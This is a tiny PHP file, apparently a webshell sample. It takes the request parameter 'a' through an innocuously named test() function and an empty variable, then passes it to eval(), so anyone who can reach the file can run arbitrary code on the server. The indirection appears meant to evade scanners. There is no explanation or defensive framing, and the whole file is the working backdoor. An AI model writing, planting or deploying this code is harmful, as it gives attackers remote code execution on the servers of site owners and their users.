<?php 
function test(){
$test=$_REQUEST['a'];
	return $test;
}
$a=null;

eval($d=$a.test());
?>